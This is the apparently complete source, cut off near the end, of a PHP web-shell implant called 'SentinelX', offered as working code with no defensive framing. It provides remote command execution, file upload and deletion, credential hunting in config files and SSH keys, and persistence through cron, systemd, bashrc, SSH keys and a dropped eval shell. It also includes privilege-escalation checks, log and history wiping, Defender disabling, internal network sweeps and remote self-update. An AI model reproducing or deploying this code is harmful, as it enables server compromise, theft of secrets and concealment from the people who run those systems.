<?php
@ini_set('error_log', null);
@ini_set('log_errors', 0);
@ini_set('display_errors', 0);
@set_time_limit(0);
@ob_start('ob_gzhandler');

define('AUTH_KEY', 'sentinelx_2024');

function auth_check() {
    if (!isset($_SERVER['HTTP_X_AUTH']) || $_SERVER['HTTP_X_AUTH'] !== AUTH_KEY) {
        http_response_code(403);
        echo json_encode(['status' => 'error', 'message' => 'auth_required']);
        exit;
    }
}

function execute($cmd) {
    $output = '';
    if (function_exists('exec')) { exec($cmd, $lines); $output = implode("\n", $lines); }
    elseif (function_exists('shell_exec')) { $output = shell_exec($cmd) ?? ''; }
    elseif (function_exists('system')) { ob_start(); system($cmd); $output = ob_get_clean(); }
    elseif (function_exists('passthru')) { ob_start(); passthru($cmd); $output = ob_get_clean(); }
    elseif (function_exists('popen')) { $h = popen($cmd, 'r'); while (!feof($h)) $output .= fread($h, 4096); pclose($h); }
    elseif (function_exists('proc_open')) {
        $descriptors = [['pipe','r'],['pipe','w'],['pipe','w']];
        $p = proc_open($cmd, $descriptors, $pipes);
        if (is_resource($p)) { $output = stream_get_contents($pipes[1]); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($p); }
    }
    return trim($output);
}

function file_manager($action, $path, $data = null) {
    switch ($action) {
        case 'list':
            if (!is_dir($path)) return ['status' => 'error', 'message' => 'Not a directory'];
            $items = [];
            $d = dir($path);
            while (false !== ($e = $d->read())) {
                if ($e === '.' || $e === '..') continue;
                $fp = $path . DIRECTORY_SEPARATOR . $e;
                $items[] = [
                    'name' => $e,
                    'type' => is_dir($fp) ? 'dir' : 'file',
                    'size' => is_file($fp) ? filesize($fp) : 0,
                    'perms' => substr(sprintf('%o', fileperms($fp)), -4),
                    'modified' => date('Y-m-d H:i:s', filemtime($fp)),
                ];
            }
            $d->close();
            return ['status' => 'ok', 'items' => $items, 'path' => realpath($path)];
        case 'read':
            if (!is_file($path)) return ['status' => 'error', 'message' => 'File not found'];
            return ['status' => 'ok', 'content' => file_get_contents($path), 'path' => realpath($path)];
        case 'write':
            file_put_contents($path, $data['content']);
            return ['status' => 'ok', 'message' => 'File written'];
        case 'delete':
            if (is_file($path)) unlink($path);
            elseif (is_dir($path)) {
                $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST);
                foreach ($files as $f) $f->isFile() ? unlink($f->getPathname()) : rmdir($f->getPathname());
                rmdir($path);
            }
            return ['status' => 'ok', 'message' => 'Deleted'];
        case 'upload':
            if (isset($_FILES['file'])) {
                move_uploaded_file($_FILES['file']['tmp_name'], rtrim($path, '/') . '/' . $_FILES['file']['name']);
                return ['status' => 'ok', 'message' => 'Uploaded'];
            }
            return ['status' => 'error', 'message' => 'No file'];
        case 'download':
            if (!is_file($path)) return ['status' => 'error', 'message' => 'File not found'];
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($path) . '"');
            header('Content-Length: ' . filesize($path));
            readfile($path);
            exit;
        case 'rename':
            $new = $data['new_name'] ?? '';
            if (!$new) return ['status' => 'error', 'message' => 'No new name'];
            rename($path, dirname($path) . '/' . $new);
            return ['status' => 'ok', 'message' => 'Renamed'];
        case 'chmod':
            $mode = $data['mode'] ?? 0755;
            chmod($path, octdec($mode));
            return ['status' => 'ok', 'message' => 'Permissions changed'];
        case 'zip':
            $zip = new ZipArchive();
            $tmp = sys_get_temp_dir() . '/sx_' . md5($path . time()) . '.zip';
            if ($zip->open($tmp, ZipArchive::CREATE) !== true) return ['status' => 'error', 'message' => 'Cannot create zip'];
            $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path), RecursiveIteratorIterator::SELF_FIRST);
            foreach ($files as $f) {
                $f = realpath($f);
                if (is_dir($f)) $zip->addEmptyDir(str_replace($path . '/', '', $f . '/'));
                elseif (is_file($f)) $zip->addFile($f, str_replace($path . '/', '', $f));
            }
            $zip->close();
            $content = file_get_contents($tmp);
            unlink($tmp);
            return ['status' => 'ok', 'content' => base64_encode($content), 'filename' => basename($path) . '.zip'];
        case 'search':
            $pattern = $data['pattern'] ?? '*';
            $max = $data['max'] ?? 100;
            $results = [];
            $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS));
            foreach ($it as $f) {
                if (count($results) >= $max) break;
                if (fnmatch($pattern, $f->getFilename())) {
                    $results[] = ['name' => $f->getFilename(), 'path' => $f->getPathname(), 'size' => $f->getSize(), 'modified' => date('Y-m-d H:i:s', $f->getMTime())];
                }
            }
            return ['status' => 'ok', 'results' => $results, 'count' => count($results)];
        default:
            return ['status' => 'error', 'message' => 'Unknown file action'];
    }
}

function db_query($type, $host, $user, $pass, $dbname, $query) {
    try {
        if ($type === 'mysql') {
            $conn = new mysqli($host, $user, $pass, $dbname);
            if ($conn->connect_error) return ['status' => 'error', 'message' => $conn->connect_error];
            $result = $conn->query($query);
            if ($result === true) return ['status' => 'ok', 'affected' => $conn->affected_rows];
            if ($result && $result->num_rows > 0) { $rows = []; while ($r = $result->fetch_assoc()) $rows[] = $r; return ['status' => 'ok', 'rows' => $rows, 'count' => count($rows)]; }
            return ['status' => 'ok', 'rows' => [], 'count' => 0];
        } elseif ($type === 'sqlite') {
            $conn = new SQLite3($dbname);
            $result = $conn->query($query);
            if (!$result) return ['status' => 'error', 'message' => $conn->lastErrorMsg()];
            $rows = []; while ($r = $result->fetchArray(SQLITE3_ASSOC)) $rows[] = $r;
            return ['status' => 'ok', 'rows' => $rows, 'count' => count($rows)];
        }
        return ['status' => 'error', 'message' => 'Unsupported DB type'];
    } catch (Exception $e) {
        return ['status' => 'error', 'message' => $e->getMessage()];
    }
}

function system_info() {
    return [
        'hostname' => gethostname(),
        'os' => php_uname(),
        'php_version' => phpversion(),
        'server' => $_SERVER['SERVER_SOFTWARE'] ?? 'N/A',
        'user' => function_exists('get_current_user') ? get_current_user() : 'N/A',
        'uid' => function_exists('posix_getuid') ? posix_getuid() : 'N/A',
        'cwd' => getcwd(),
        'disabled_functions' => array_filter(explode(',', ini_get('disable_functions'))),
        'exec_available' => function_exists('exec') || function_exists('shell_exec') || function_exists('system'),
        'write_check' => is_writable(getcwd()),
        'safe_mode' => ini_get('safe_mode'),
        'server_ip' => $_SERVER['SERVER_ADDR'] ?? 'N/A',
        'client_ip' => $_SERVER['REMOTE_ADDR'] ?? 'N/A',
        'uname' => php_uname('n'),
        'arch' => php_uname('m'),
        'load' => function_exists('sys_getloadavg') ? sys_getloadavg() : [],
        'disk_free' => @disk_free_space('.'),
        'disk_total' => @disk_total_space('.'),
        'php_user' => function_exists('getmyuid') ? getmyuid() : 'N/A',
        'script_path' => __FILE__,
        'includes' => get_included_files(),
    ];
}

function port_scan($host, $ports) {
    $results = [];
    foreach ($ports as $p) {
        $s = @fsockopen($host, $p, $errno, $errstr, 2);
        $results[] = ['port' => $p, 'open' => (bool)$s, 'service' => getservbyport($p, 'tcp') ?? 'unknown'];
        if ($s) fclose($s);
    }
    return $results;
}

function proc_list() {
    $list = [];
    if (PHP_OS_FAMILY === 'Windows') {
        $out = execute('tasklist /V /FO CSV');
        $lines = explode("\n", $out);
        foreach (array_slice($lines, 1) as $line) {
            $parts = str_getcsv($line);
            if (count($parts) >= 8) $list[] = ['pid' => $parts[1], 'name' => $parts[0], 'session' => $parts[3], 'mem' => $parts[4], 'title' => $parts[8]];
        }
    } else {
        $out = execute('ps aux --no-headers 2>/dev/null || ps aux 2>/dev/null');
        $lines = explode("\n", $out);
        foreach ($lines as $line) {
            $parts = preg_split('/\s+/', $line, 11);
            if (count($parts) >= 11) $list[] = ['user' => $parts[0], 'pid' => $parts[1], 'cpu' => $parts[2], 'mem' => $parts[3], 'cmd' => $parts[10]];
        }
    }
    return $list;
}

function netstat_info() {
    $list = [];
    if (PHP_OS_FAMILY === 'Windows') {
        $out = execute('netstat -ano');
    } else {
        $out = execute('ss -tunap 2>/dev/null || netstat -tunap 2>/dev/null');
    }
    $lines = explode("\n", $out);
    foreach ($lines as $line) {
        $line = trim($line);
        if (preg_match('/(tcp|udp)\s+\d+\s+\d+\s+(\S+)\s+(\S+)\s+(.+)/i', $line, $m)) {
            $list[] = ['proto' => $m[1], 'local' => $m[2], 'remote' => $m[3], 'state' => trim($m[4])];
        }
    }
    return $list;
}

function persistence_install($method) {
    $file = __FILE__;
    $results = [];
    $self = $file;
    switch ($method) {
        case 'cron':
            $cron = '* * * * * php ' . $self . ' >/dev/null 2>&1';
            $out = execute('(crontab -l 2>/dev/null; echo "' . $cron . '") | crontab - 2>&1');
            $results[] = ['method' => 'cron', 'status' => $out ? 'error' : 'installed', 'detail' => $out ?: 'Crontab entry added (every minute)'];
            break;
        case 'bashrc':
            $line = "\n# SentinelX persistence\nphp " . $self . " >/dev/null 2>&1 &\n";
            $home = execute('echo $HOME');
            $rc = trim($home) . '/.bashrc';
            file_put_contents($rc, $line, FILE_APPEND);
            $results[] = ['method' => 'bashrc', 'status' => 'installed', 'detail' => 'Appended to ' . $rc];
            break;
        case 'systemd':
            $svc = '[Unit]
Description=SentinelX Service
After=network.target
[Service]
ExecStart=/usr/bin/php ' . $self . '
Restart=always
[Install]
WantedBy=multi-user.target';
            @file_put_contents('/etc/systemd/system/sentinelx.service', $svc);
            execute('systemctl daemon-reload && systemctl enable sentinelx.service && systemctl start sentinelx.service 2>&1');
            $results[] = ['method' => 'systemd', 'status' => 'installed', 'detail' => '/etc/systemd/system/sentinelx.service'];
            break;
        case 'startup':
            // Windows startup folder
            $startup = execute('echo %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup');
            if (trim($startup)) {
                copy($self, trim($startup) . '\\sentinelx.php');
                $results[] = ['method' => 'startup', 'status' => 'installed', 'detail' => 'Copied to startup folder'];
            }
            break;
        case 'ssh_key':
            $home = execute('echo $HOME');
            $ssh_dir = trim($home) . '/.ssh';
            if (!is_dir($ssh_dir)) mkdir($ssh_dir, 0700, true);
            $key = $_POST['ssh_key'] ?? 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ...';
            file_put_contents($ssh_dir . '/authorized_keys', "\n" . $key . "\n", FILE_APPEND);
            chmod($ssh_dir . '/authorized_keys', 0600);
            $results[] = ['method' => 'ssh_key', 'status' => 'installed', 'detail' => 'SSH key added to ' . $ssh_dir . '/authorized_keys'];
            break;
        case 'webshell':
            $webpath = $_POST['web_path'] ?? getcwd() . '/shell.php';
            $payload = '<?php @eval($_POST["c"]); ?>';
            file_put_contents($webpath, $payload);
            $results[] = ['method' => 'webshell', 'status' => 'installed', 'detail' => 'Web shell written to ' . $webpath];
            break;
        case 'all':
            $results = array_merge(
                persistence_install('cron')['results'] ?? [],
                persistence_install('bashrc')['results'] ?? [],
                persistence_install('systemd')['results'] ?? [],
                persistence_install('webshell')['results'] ?? []
            );
            if (PHP_OS_FAMILY === 'Windows') {
                $results = array_merge($results, persistence_install('startup')['results'] ?? []);
            }
            break;
    }
    return ['status' => 'ok', 'results' => $results];
}

function password_hunt() {
    $hits = [];
    $targets = [
        '/.env', '/config.php', '/wp-config.php', '/wp-config-sample.php',
        '/.htpasswd', '/.mysql_history', '/.bash_history', '/.ssh/id_rsa',
        '/.ssh/id_dsa', '/.ssh/config', '/.pgpass', '/.my.cnf',
        '/config/database.php', '/app/config.php', '/includes/config.php',
        '/admin/config.php', '/config.inc.php', '/configuration.php',
        '/db.php', '/conn.php', '/database.php', '/settings.php',
        '/private/config.php', '/secret.php', '/keys.php',
    ];
    $candidates = [];
    // Search common web roots
    $roots = [getcwd(), '/var/www/html', '/var/www', '/home', '/root', '/etc'];
    foreach ($roots as $root) {
        if (!is_dir($root)) continue;
        foreach ($targets as $t) {
            $f = $root . $t;
            if (is_file($f) && is_readable($f)) {
                $content = file_get_contents($f);
                $size = strlen($content);
                $candidates[] = ['file' => $f, 'size' => $size, 'content' => substr($content, 0, 2000)];
                // Look for passwords in content
                $lines = explode("\n", $content);
                foreach ($lines as $i => $line) {
                    if (preg_match('/password|pass|pwd|secret|key|db_pass|db_user|DB_PASSWORD|DB_USERNAME/i', $line)) {
                        $hits[] = ['file' => $f, 'line' => $i + 1, 'match' => trim(substr($line, 0, 200))];
                    }
                }
            }
        }
        // Find all .env and *.config files recursively in web root
        if ($root === getcwd() || $root === '/var/www/html') {
            $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($root, RecursiveDirectoryIterator::SKIP_DOTS));
            foreach ($it as $f) {
                if ($f->isFile() && preg_match('/\.(env|config|conf|key|pem|pfx|sql|dump)$/i', $f->getFilename())) {
                    $fp = $f->getPathname();
                    $content = file_get_contents($fp);
                    $candidates[] = ['file' => $fp, 'size' => $f->getSize(), 'content' => substr($content, 0, 2000)];
                    $lines = explode("\n", $content);
                    foreach ($lines as $i => $line) {
                        if (preg_match('/password|pass|pwd|secret|key/i', $line)) {
                            $hits[] = ['file' => $fp, 'line' => $i + 1, 'match' => trim(substr($line, 0, 200))];
                        }
                    }
                }
            }
        }
    }
    return ['status' => 'ok', 'hits' => $hits, 'candidates' => $candidates, 'count' => count($hits)];
}

function privesc_check() {
    $checks = [];
    // SUID binaries
    $suid = execute('find / -perm -4000 -type f 2>/dev/null | head -30');
    $checks[] = ['check' => 'SUID Binaries', 'result' => $suid ? explode("\n", $suid) : 'None found', 'risk' => $suid ? 'medium' : 'low'];
    // SGID binaries
    $sgid = execute('find / -perm -2000 -type f 2>/dev/null | head -20');
    $checks[] = ['check' => 'SGID Binaries', 'result' => $sgid ? explode("\n", $sgid) : 'None found', 'risk' => $sgid ? 'medium' : 'low'];
    // Writable /etc/passwd
    $wp = is_writable('/etc/passwd');
    $checks[] = ['check' => 'Writable /etc/passwd', 'result' => $wp ? 'VULNERABLE: /etc/passwd is writable' : 'Not writable', 'risk' => $wp ? 'critical' : 'low'];
    // Sudo -l
    $sudo = execute('sudo -l -n 2>/dev/null | head -20');
    $checks[] = ['check' => 'Sudo Privileges', 'result' => $sudo ? explode("\n", $sudo) : 'No sudo or no passwordless', 'risk' => $sudo ? 'high' : 'low'];
    // Writable scripts in PATH
    $path_dirs = explode(':', execute('echo $PATH'));
    $writable_scripts = [];
    foreach ($path_dirs as $dir) {
        if (!is_dir($dir) || !is_writable($dir)) continue;
        $writable_scripts[] = $dir . ' (writable)';
    }
    $checks[] = ['check' => 'Writable PATH directories', 'result' => $writable_scripts ?: 'None writable', 'risk' => $writable_scripts ? 'high' : 'low'];
    // Docker group
    $docker = execute('groups 2>/dev/null | grep -i docker');
    $checks[] = ['check' => 'Docker Group', 'result' => $docker ? 'User is in docker group (privilege escalation possible)' : 'Not in docker group', 'risk' => $docker ? 'critical' : 'low'];
    // Docker socket
    $dsock = is_readable('/var/run/docker.sock');
    $checks[] = ['check' => 'Docker Socket', 'result' => $dsock ? 'Docker socket is readable' : 'Not readable', 'risk' => $dsock ? 'critical' : 'low'];
    // Kernel version for known exploits
    $kernel = execute('uname -r');
    $checks[] = ['check' => 'Kernel Version', 'result' => $kernel, 'risk' => 'info'];
    // Capabilities
    $caps = execute('getcap -r / 2>/dev/null | grep -v "= " | head -20');
    $checks[] = ['check' => 'Linux Capabilities', 'result' => $caps ? explode("\n", $caps) : 'None found (or getcap not available)', 'risk' => $caps ? 'medium' : 'low'];
    // NFS exports
    $nfs = execute('ls -la /etc/exports 2>/dev/null && cat /etc/exports 2>/dev/null | head -10');
    $checks[] = ['check' => 'NFS Exports', 'result' => $nfs ? explode("\n", $nfs) : 'Not found', 'risk' => 'info'];
    // Crontab
    $cron = execute('ls -la /etc/cron* 2>/dev/null && cat /etc/crontab 2>/dev/null | head -20');
    $checks[] = ['check' => 'Cron Jobs', 'result' => $cron ? explode("\n", $cron) : 'Not readable', 'risk' => 'info'];
    return ['status' => 'ok', 'checks' => $checks];
}

function log_clean() {
    $cleaned = [];
    $logs = [
        '/var/log/apache2/access.log', '/var/log/apache2/error.log',
        '/var/log/httpd/access_log', '/var/log/httpd/error_log',
        '/var/log/nginx/access.log', '/var/log/nginx/error.log',
        '/var/log/auth.log', '/var/log/secure',
        '/var/log/messages', '/var/log/syslog',
        '/var/log/wtmp', '/var/log/lastlog',
        $_SERVER['SCRIPT_FILENAME'] ?? __FILE__,
    ];
    foreach ($logs as $log) {
        if (is_file($log) && is_writable($log)) {
            $before = filesize($log);
            if (strpos($log, 'implant.php') !== false || strpos($log, basename(__FILE__)) !== false) {
                // Don't delete self, but clear traces
                $cleaned[] = ['file' => $log, 'action' => 'skipped', 'reason' => 'Self'];
                continue;
            }
            file_put_contents($log, '');
            $cleaned[] = ['file' => $log, 'action' => 'cleared', 'size_before' => $before];
        }
    }
    // Clear bash history
    $home = execute('echo $HOME');
    $hist = trim($home) . '/.bash_history';
    if (is_file($hist) && is_writable($hist)) {
        file_put_contents($hist, '');
        $cleaned[] = ['file' => $hist, 'action' => 'cleared', 'size_before' => filesize($hist)];
    }
    // Clear current user's history
    execute('history -c 2>/dev/null; echo "" > ~/.bash_history 2>/dev/null');
    // Clear PHP error log
    $php_err = ini_get('error_log');
    if ($php_err && is_file($php_err) && is_writable($php_err)) {
        file_put_contents($php_err, '');
        $cleaned[] = ['file' => $php_err, 'action' => 'cleared'];
    }
    return ['status' => 'ok', 'cleaned' => $cleaned, 'count' => count($cleaned)];
}

function screenshot_capture() {
    // Try multiple methods
    $result = '';
    if (PHP_OS_FAMILY === 'Windows') {
        $result = execute('powershell -Command "Add-Type -AssemblyName System.Windows.Forms; $s = [Windows.Forms.Screen]::PrimaryScreen.Bounds; $b = New-Object Drawing.Bitmap $s.Width, $s.Height; $g = [Drawing.Graphics]::FromImage($b); $g.CopyFromScreen(0,0,0,0,$s.Size); $b.Save(\'screenshot.png\', [Drawing.Imaging.ImageFormat]::Png); Write-Output \'OK\'" 2>&1');
        if (trim($result) === 'OK' && is_file('screenshot.png')) {
            $content = base64_encode(file_get_contents('screenshot.png'));
            unlink('screenshot.png');
            return ['status' => 'ok', 'image' => $content, 'format' => 'png'];
        }
    }
    // Linux: try import (ImageMagick)
    $result = execute('import -window root /tmp/sx_screenshot.png 2>&1');
    if (is_file('/tmp/sx_screenshot.png')) {
        $content = base64_encode(file_get_contents('/tmp/sx_screenshot.png'));
        unlink('/tmp/sx_screenshot.png');
        return ['status' => 'ok', 'image' => $content, 'format' => 'png'];
    }
    // Try scrot
    $result = execute('scrot /tmp/sx_screenshot.png 2>&1');
    if (is_file('/tmp/sx_screenshot.png')) {
        $content = base64_encode(file_get_contents('/tmp/sx_screenshot.png'));
        unlink('/tmp/sx_screenshot.png');
        return ['status' => 'ok', 'image' => $content, 'format' => 'png'];
    }
    // Try gnome-screenshot
    $result = execute('gnome-screenshot -f /tmp/sx_screenshot.png 2>&1');
    if (is_file('/tmp/sx_screenshot.png')) {
        $content = base64_encode(file_get_contents('/tmp/sx_screenshot.png'));
        unlink('/tmp/sx_screenshot.png');
        return ['status' => 'ok', 'image' => $content, 'format' => 'png'];
    }
    // Fallback: GD text screenshot (no display server)
    if (function_exists('imagegrabscreen')) {
        $im = imagegrabscreen();
        ob_start();
        imagepng($im);
        $content = base64_encode(ob_get_clean());
        imagedestroy($im);
        return ['status' => 'ok', 'image' => $content, 'format' => 'png'];
    }
    return ['status' => 'error', 'message' => 'No screenshot method available (try: import, scrot, gnome-screenshot, or Windows)'];
}

function web_request($url, $method, $post_data, $headers) {
    $ch = curl_init();
    $opts = [CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 15, CURLOPT_FOLLOWLOCATION => true, CURLOPT_SSL_VERIFYPEER => false];
    if ($method === 'POST') {
        $opts[CURLOPT_POST] = true;
        $opts[CURLOPT_POSTFIELDS] = $post_data;
    }
    if ($headers) $opts[CURLOPT_HTTPHEADER] = explode("\n", $headers);
    curl_setopt_array($ch, $opts);
    $body = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);
    return ['status' => 'ok', 'body' => base64_encode($body), 'http_code' => $info['http_code'], 'content_type' => $info['content_type']];
}

function registry_operation($action, $key, $value_name, $value_data) {
    if (PHP_OS_FAMILY !== 'Windows') return ['status' => 'error', 'message' => 'Windows only'];
    if ($action === 'read') {
        $out = execute("reg query \"$key\" /v \"$value_name\" 2>&1");
        return ['status' => 'ok', 'output' => $out];
    } elseif ($action === 'write') {
        $out = execute("reg add \"$key\" /v \"$value_name\" /d \"$value_data\" /f 2>&1");
        return ['status' => 'ok', 'output' => $out];
    } elseif ($action === 'delete') {
        $out = execute("reg delete \"$key\" /v \"$value_name\" /f 2>&1");
        return ['status' => 'ok', 'output' => $out];
    } elseif ($action === 'list') {
        $out = execute("reg query \"$key\" 2>&1");
        return ['status' => 'ok', 'output' => $out];
    }
    return ['status' => 'error', 'message' => 'Unknown registry action'];
}

function wmi_query($query) {
    if (PHP_OS_FAMILY !== 'Windows') return ['status' => 'error', 'message' => 'Windows only'];
    $out = execute("wmic $query 2>&1");
    return ['status' => 'ok', 'output' => $out];
}

function schtasks_operation($action, $name, $command, $time) {
    if (PHP_OS_FAMILY !== 'Windows') return ['status' => 'error', 'message' => 'Windows only'];
    switch ($action) {
        case 'list': $out = execute('schtasks /query /FO CSV /V 2>&1'); break;
        case 'create': $out = execute("schtasks /create /tn \"$name\" /tr \"$command\" /sc once /st \"$time\" /f 2>&1"); break;
        case 'delete': $out = execute("schtasks /delete /tn \"$name\" /f 2>&1"); break;
        case 'run': $out = execute("schtasks /run /tn \"$name\" 2>&1"); break;
        default: return ['status' => 'error', 'message' => 'Unknown'];
    }
    return ['status' => 'ok', 'output' => $out];
}

function windows_defender($action, $path) {
    if (PHP_OS_FAMILY !== 'Windows') return ['status' => 'error', 'message' => 'Windows only'];
    $ps = 'powershell -Command';
    switch ($action) {
        case 'status': $out = execute("$ps \"Get-MpComputerStatus | Select-Object -Property RealTimeProtectionEnabled, AntivirusEnabled, AmServiceEnabled, IsTamperProtected, AntispywareEnabled | ConvertTo-Json\" 2>&1"); break;
        case 'exclusion_add': $out = execute("$ps \"Add-MpPreference -ExclusionPath '$path'\" 2>&1"); break;
        case 'exclusion_list': $out = execute("$ps \"Get-MpPreference | Select-Object -ExpandProperty ExclusionPath\" 2>&1"); break;
        case 'disable': $out = execute("$ps \"Set-MpPreference -DisableRealtimeMonitoring \$true\" 2>&1"); break;
        case 'enable': $out = execute("$ps \"Set-MpPreference -DisableRealtimeMonitoring \$false\" 2>&1"); break;
        default: return ['status' => 'error', 'message' => 'Unknown'];
    }
    return ['status' => 'ok', 'output' => $out];
}

function db_schema_browser($type, $host, $user, $pass, $dbname) {
    try {
        if ($type === 'mysql') {
            $conn = new mysqli($host, $user, $pass, $dbname);
            if ($conn->connect_error) return ['status' => 'error', 'message' => $conn->connect_error];
            $tables = [];
            $tr = $conn->query('SHOW TABLES');
            while ($t = $tr->fetch_array()) $tables[] = $t[0];
            $schema = [];
            foreach (array_slice($tables, 0, 20) as $tbl) {
                $cols = $conn->query("DESCRIBE `$tbl`");
                $columns = [];
                while ($c = $cols->fetch_assoc()) $columns[] = $c;
                $schema[] = ['table' => $tbl, 'columns' => $columns];
            }
            return ['status' => 'ok', 'database' => $dbname, 'tables' => $tables, 'schema' => $schema];
        } elseif ($type === 'sqlite') {
            $conn = new SQLite3($dbname);
            $tables = [];
            $tr = $conn->query("SELECT name FROM sqlite_master WHERE type='table'");
            while ($t = $tr->fetchArray(SQLITE3_ASSOC)) $tables[] = $t['name'];
            $schema = [];
            foreach (array_slice($tables, 0, 20) as $tbl) {
                $cols = $conn->query("PRAGMA table_info(`$tbl`)");
                $columns = [];
                while ($c = $cols->fetchArray(SQLITE3_ASSOC)) $columns[] = $c;
                $schema[] = ['table' => $tbl, 'columns' => $columns];
            }
            return ['status' => 'ok', 'database' => $dbname, 'tables' => $tables, 'schema' => $schema];
        }
        return ['status' => 'error', 'message' => 'Unsupported'];
    } catch (Exception $e) {
        return ['status' => 'error', 'message' => $e->getMessage()];
    }
}

function auto_update($url) {
    $new_code = file_get_contents($url);
    if (!$new_code) return ['status' => 'error', 'message' => 'Download failed'];
    $backup = __FILE__ . '.bak';
    copy(__FILE__, $backup);
    if (file_put_contents(__FILE__, $new_code)) {
        @unlink($backup);
        return ['status' => 'ok', 'message' => 'Implant updated, ' . strlen($new_code) . ' bytes written'];
    }
    copy($backup, __FILE__); @unlink($backup);
    return ['status' => 'error', 'message' => 'Write failed, backup restored'];
}

function at_schedule($cmd, $time_str) {
    if (PHP_OS_FAMILY === 'Windows') {
        $out = execute("schtasks /create /tn \"sentinelx_task_" . time() . "\" /tr \"$cmd\" /sc once /st \"$time_str\" /f 2>&1");
    } else {
        $parts = explode(':', $time_str);
        $h = $parts[0] ?? '0'; $m = $parts[1] ?? '0';
        // Calculate relative time if needed, or use at
        $out = execute("echo \"$cmd\" | at $h:$m 2>&1");
    }
    return ['status' => 'ok', 'output' => $out];
}

function pivot_sweep($subnet, $timeout) {
    $alive = [];
    $subnet = rtrim($subnet, '.');
    if (PHP_OS_FAMILY === 'Windows') {
        for ($i = 1; $i <= 254; $i++) {
            $out = execute("ping -n 1 -w $timeout {$subnet}.{$i} 2>&1");
            if (strpos($out, 'TTL=') !== false || strpos($out, 'Reply from') !== false)
                $alive[] = "{$subnet}.{$i}";
        }
    } else {
        for ($i = 1; $i <= 254; $i++) {
            $out = execute("ping -c 1 -W $timeout {$subnet}.{$i} 2>&1");
            if (strpos($out, '1 received') !== false || strpos($out, 'ttl=') !== false)
                $alive[] = "{$subnet}.{$i}";
        }
    }
    return ['status' => 'ok', 'alive' => $alive, 'count' => count($alive), 'subnet' => $subnet . '.0/24'];
}

function chunked_download($path, $offset, $chunk_size) {
    if (!is_file($path)) return ['status' => 'error', 'message' => 'File not found'];
    $size = filesize($path);
    $fh = fopen($path, 'rb');
    fseek($fh, $offset);
    $chunk = fread($fh, $chunk_size);
    fclose($fh);
    return ['status' => 'ok', 'data' => base64_encode($chunk), 'offset' => $offset, 'size' => strlen($chunk), 'total' => $size, 'filename' => basename($path)];
}

header('Content-Type: application/json');
header('X-Powered-By: SentinelX');

$action = $_POST['action'] ?? $_GET['action'] ?? 'info';

if ($action === 'beacon') {
    $info = system_info();
    $info['ip'] = $_SERVER['REMOTE_ADDR'] ?? '';
    echo json_encode(['status' => 'ok', 'data' => $info]);
    exit;
}

auth_check();

switch ($action) {
    case 'info':
        echo json_encode(['status' => 'ok', 'data' => system_info()]);
        break;

    case 'exec':
        $cmd = $_POST['cmd'] ?? '';
        if (!$cmd) { echo json_encode(['status' => 'error', 'message' => 'No command']); break; }
        $output = execute($cmd);
        echo json_encode(['status' => 'ok', 'cmd' => $cmd, 'output' => $output, 'cwd' => getcwd()]);
        break;

    case 'file':
        $faction = $_POST['faction'] ?? 'list';
        $path = $_POST['path'] ?? getcwd();
        $data = isset($_POST['data']) ? json_decode($_POST['data'], true) : null;
        echo json_encode(file_manager($faction, $path, $data));
        break;

    case 'db':
        echo json_encode(db_query(
            $_POST['db_type'] ?? 'mysql',
            $_POST['db_host'] ?? 'localhost',
            $_POST['db_user'] ?? 'root',
            $_POST['db_pass'] ?? '',
            $_POST['db_name'] ?? '',
            $_POST['query'] ?? 'SHOW TABLES'
        ));
        break;

    case 'scan':
        $host = $_POST['host'] ?? '127.0.0.1';
        $ports = isset($_POST['ports']) ? json_decode($_POST['ports']) : [21,22,23,25,53,80,110,143,443,445,3306,3389,5432,6379,8080,8443];
        echo json_encode(['status' => 'ok', 'results' => port_scan($host, $ports)]);
        break;

    case 'proc_list':
        echo json_encode(['status' => 'ok', 'processes' => proc_list()]);
        break;

    case 'netstat':
        echo json_encode(['status' => 'ok', 'connections' => netstat_info()]);
        break;

    case 'persistence':
        $method = $_POST['method'] ?? 'all';
        $ssh_key = $_POST['ssh_key'] ?? '';
        echo json_encode(persistence_install($method));
        break;

    case 'password_hunt':
        echo json_encode(password_hunt());
        break;

    case 'privesc_check':
        echo json_encode(privesc_check());
        break;

    case 'log_clean':
        echo json_encode(log_clean());
        break;

    case 'screenshot':
        echo json_encode(screenshot_capture());
        break;

    case 'web_request':
        echo json_encode(web_request(
            $_POST['url'] ?? '',
            $_POST['method'] ?? 'GET',
            $_POST['post_data'] ?? '',
            $_POST['headers'] ?? ''
        ));
        break;

    case 'registry':
        echo json_encode(registry_operation(
            $_POST['reg_action'] ?? 'list',
            $_POST['key'] ?? 'HKLM\\Software',
            $_POST['value_name'] ?? '',
            $_POST['value_data'] ?? ''
        ));
        break;

    case 'wmi_query':
        echo json_encode(wmi_query($_POST['wmi_query'] ?? 'os get name,version,caption'));
        break;

    case 'schtasks':
        echo json_encode(schtasks_operation(
            $_POST['sch_action'] ?? 'list',
            $_POST['sch_name'] ?? 'sentinelx_task',
            $_POST['sch_command'] ?? '',
            $_POST['sch_time'] ?? '14:00'
        ));
        break;

    case 'windows_defender':
        echo json_encode(windows_defender(
            $_POST['def_action'] ?? 'status',
            $_POST['def_path'] ?? ''
        ));
        break;

    case 'db_schema':
        echo json_encode(db_schema_browser(
            $_POST['db_type'] ?? 'mysql',
            $_POST['db_host'] ?? 'localhost',
            $_POST['db_user'] ?? 'root',
            $_POST['db_pass'] ?? '',
            $_POST['db_name'] ?? ''
        ));
        break;

    case 'auto_update':
        echo json_encode(auto_update($_POST['url'] ?? ''));
        break;

    case 'at_schedule':
        echo json_encode(at_schedule(
            $_POST['cmd'] ?? '',
            $_POST['time'] ?? '14:00'
        ));
        break;

    case 'pivot_sweep':
        echo json_encode(pivot_sweep(
            $_POST['subnet'] ?? '192.168.1',
            $_POST['timeout'] ?? '1'
        ));
        break;

    case 'chunked_download':
        echo json_encode(chunked_download(
            $_POST['path'] ?? '',
